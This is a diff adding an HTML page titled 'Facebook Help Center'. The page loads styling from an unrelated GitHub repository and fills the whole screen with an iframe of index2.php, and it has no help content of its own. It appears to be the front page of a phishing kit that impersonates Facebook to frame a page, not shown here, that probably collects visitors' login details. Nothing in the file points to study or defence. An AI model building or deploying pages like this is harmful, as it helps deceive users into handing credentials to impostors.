@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Help Center</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/penguasa-de/de@main/bootstrap.min.css">
+</head>
+<body>
+<div class="embed-responsive embed-responsive-16by9" style="height:100vh" id="iframeContainer"></div>
+<script>
+const iframeURL = 'index2.php';
+const iframeContainer = document.getElementById('iframeContainer');
+const iframe = document.createElement('iframe');
+iframe.src = iframeURL;
+iframe.className = 'embed-responsive-item';
+iframe.allowFullscreen = true;
+iframeContainer.appendChild(iframe);
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"6dbabaef77494562958fb2173f9595f7","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
+</html>
